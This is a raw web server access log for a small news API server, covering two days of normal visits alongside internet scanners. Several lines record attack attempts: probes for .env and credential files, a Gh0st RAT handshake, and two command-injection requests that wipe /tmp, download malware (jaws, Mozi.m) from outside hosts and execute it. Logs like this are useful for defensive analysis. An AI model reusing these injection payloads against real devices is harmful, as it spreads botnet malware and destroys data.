112.210.229.46 - - [09/Oct/2024:16:21:59 +0900] "POST /account/register/ HTTP/1.1" 400 53 "-" "node"
3.230.143.81 - - [09/Oct/2024:16:25:28 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
112.210.229.46 - - [09/Oct/2024:16:34:41 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:16:35:09 +0900] "POST /account/login/ HTTP/1.1" 400 43 "-" "node"
112.210.229.46 - - [09/Oct/2024:16:35:14 +0900] "POST /account/login/ HTTP/1.1" 400 43 "-" "node"
112.210.229.46 - - [09/Oct/2024:16:35:29 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:16:35:58 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
80.82.77.202 - - [09/Oct/2024:16:47:32 +0900] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
198.235.24.143 - - [09/Oct/2024:16:51:18 +0900] "GET / HTTP/1.0" 200 615 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
112.210.229.46 - - [09/Oct/2024:17:00:44 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:01:17 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:06:49 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:07:52 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:11:25 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:13:20 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
135.125.246.189 - - [09/Oct/2024:17:14:02 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [09/Oct/2024:17:14:03 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
112.210.229.46 - - [09/Oct/2024:17:17:54 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:18:40 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:25:21 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:27:16 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:31:29 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
35.195.29.134 - - [09/Oct/2024:17:37:03 +0900] "GET / HTTP/1.1" 404 159 "-" "python-requests/2.32.3"
112.210.229.46 - - [09/Oct/2024:17:45:28 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:47:08 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:47:24 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
112.210.229.46 - - [09/Oct/2024:17:48:30 +0900] "POST /account/login/ HTTP/1.1" 200 97 "-" "node"
185.242.226.115 - - [09/Oct/2024:17:49:20 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
135.125.246.189 - - [09/Oct/2024:18:44:14 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [09/Oct/2024:18:44:15 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.240.205.34 - - [09/Oct/2024:19:29:49 +0900] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"
3.230.143.81 - - [09/Oct/2024:19:38:46 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
93.174.93.12 - - [09/Oct/2024:19:44:05 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
80.217.102.180 - - [09/Oct/2024:20:07:00 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1" 400 166 "-" "-"
135.125.246.189 - - [09/Oct/2024:20:08:15 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [09/Oct/2024:20:08:15 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.127.9.192 - - [09/Oct/2024:20:21:10 +0900] "HEAD / HTTP/1.1" 404 0 "-" "-"
79.165.192.3 - - [09/Oct/2024:20:42:47 +0900] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
92.249.48.205 - - [09/Oct/2024:21:51:47 +0900] "GET /cgi/conf.bin HTTP/1.1" 404 159 "http://13.209.93.212:80/mainFrame.htm" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11"
46.174.191.32 - - [09/Oct/2024:22:10:44 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
185.224.128.47 - - [09/Oct/2024:22:12:15 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /api/news/ HTTP/1.1" 200 1930 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3426 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1152 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/js/jquery-3.7.1.min.js HTTP/1.1" 200 87533 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3796 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1793 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 39680 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1268 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/js/load-ajax-form.js HTTP/1.1" 200 59 "http://13.209.93.212/api/news/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
175.124.165.54 - - [09/Oct/2024:22:13:59 +0900] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458 "http://13.209.93.212/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
135.125.246.110 - - [09/Oct/2024:22:37:26 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [09/Oct/2024:22:37:27 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.156.130.4 - - [09/Oct/2024:23:32:57 +0900] "GET /js/NewWindow_2_all.js HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:00:26:53 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:00:26:53 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.233.116.219 - - [08/Oct/2024:01:16:24 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
185.16.39.118 - - [08/Oct/2024:01:23:34 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.156.116 - - [08/Oct/2024:01:41:40 +0900] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEE\xD4\x12\xE9Fx+\xD6\xA4<\x01/\xD5=\xEF\xB7\x0Ev\x08\xF8\x93\xB7^\xF3\xF5Q\xAE\xCF\xCA\x0C^\x7F\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
40.118.208.150 - - [08/Oct/2024:01:45:43 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
135.125.217.54 - - [08/Oct/2024:02:09:58 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:02:09:59 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.213.187.244 - - [08/Oct/2024:02:23:06 +0900] "CONNECT google.com:443 HTTP/1.1" 400 166 "-" "-"
172.206.140.63 - - [08/Oct/2024:03:04:05 +0900] "GET /druid/index.html HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
185.224.128.47 - - [08/Oct/2024:03:27:52 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
44.233.116.219 - - [08/Oct/2024:03:29:05 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
80.82.77.202 - - [08/Oct/2024:03:42:08 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
198.235.24.159 - - [08/Oct/2024:03:52:13 +0900] "GET / HTTP/1.1" 404 159 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
202.58.200.148 - - [08/Oct/2024:03:54:22 +0900] "HEAD /invoker/EJBInvokerServlet HTTP/1.1" 404 0 "-" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"
202.58.200.148 - - [08/Oct/2024:03:54:29 +0900] "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 404 0 "-" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"
202.58.200.148 - - [08/Oct/2024:03:54:35 +0900] "HEAD /invoker/JMXInvokerServlet HTTP/1.1" 404 0 "-" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"
202.58.200.148 - - [08/Oct/2024:03:54:42 +0900] "HEAD /web-console/ServerInfo.jsp HTTP/1.1" 404 0 "-" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"
135.125.217.54 - - [08/Oct/2024:04:01:10 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:04:01:11 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:05:16:22 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:05:16:22 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.232.38.61 - - [08/Oct/2024:05:29:39 +0900] "GET / HTTP/1.1" 404 159 "-" "Linux Gnu (cow)"
172.232.38.156 - - [08/Oct/2024:05:38:35 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
172.232.38.224 - - [08/Oct/2024:05:42:50 +0900] "PUT /SDK/webLanguage HTTP/1.1" 404 159 "-" "Go-http-client/1.1"
117.209.85.199 - - [08/Oct/2024:05:55:41 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.209.85.199:37874/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
172.235.166.178 - - [08/Oct/2024:05:56:31 +0900] "\x05\x00\x0B\x03\x10\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 400 166 "-" "-"
93.174.93.12 - - [08/Oct/2024:06:12:13 +0900] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
46.174.191.32 - - [08/Oct/2024:06:15:38 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
135.125.217.54 - - [08/Oct/2024:06:41:26 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:06:41:27 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.32.68.63 - - [08/Oct/2024:07:12:12 +0900] "GET /Telerik.Web.UI.WebResource.axd%3Ftype=rau HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
103.186.101.138 - - [08/Oct/2024:07:20:48 +0900] "CONNECT www.google.com:443 HTTP/1.1" 400 166 "-" "-"
118.32.68.63 - - [08/Oct/2024:07:32:29 +0900] "GET /.vscode/sftp.json HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
135.125.217.54 - - [08/Oct/2024:08:00:00 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /api/news/allfilterednews/ HTTP/1.1" 200 136771 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/js/jquery-3.7.1.min.js HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/js/load-ajax-form.js HTTP/1.1" 304 0 "http://13.209.93.212/api/news/allfilterednews/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:39 +0900] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458 "http://13.209.93.212/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:08:58:44 +0900] "GET /api/news/ HTTP/1.1" 200 1929 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /swagger/ HTTP/1.1" 200 890 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /static/drf-yasg/style.css HTTP/1.1" 304 0 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui.css HTTP/1.1" 304 0 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-bundle.js HTTP/1.1" 304 0 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-standalone-preset.js HTTP/1.1" 304 0 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /static/drf-yasg/insQ.min.js HTTP/1.1" 304 0 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /static/drf-yasg/immutable.min.js HTTP/1.1" 304 0 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:11 +0900] "GET /static/drf-yasg/swagger-ui-init.js HTTP/1.1" 304 0 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
58.229.114.50 - - [08/Oct/2024:09:00:12 +0900] "GET /swagger/?format=openapi HTTP/1.1" 200 21517 "http://13.209.93.212/swagger/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
44.196.175.104 - - [08/Oct/2024:09:00:13 +0900] "GET /swagger/?format=openapi HTTP/1.1" 200 21517 "-" "swagger-validator"
152.42.214.50 - - [08/Oct/2024:09:07:10 +0900] "GET /cdn-cgi/trace HTTP/1.1" 404 134 "-" "Mozilla/5.0"
94.141.120.37 - - [08/Oct/2024:09:11:53 +0900] "GET /.env HTTP/1.1" 404 159 "-" "python-requests/2.26.0"
94.141.120.37 - - [08/Oct/2024:09:11:53 +0900] "POST / HTTP/1.1" 404 159 "-" "python-requests/2.26.0"
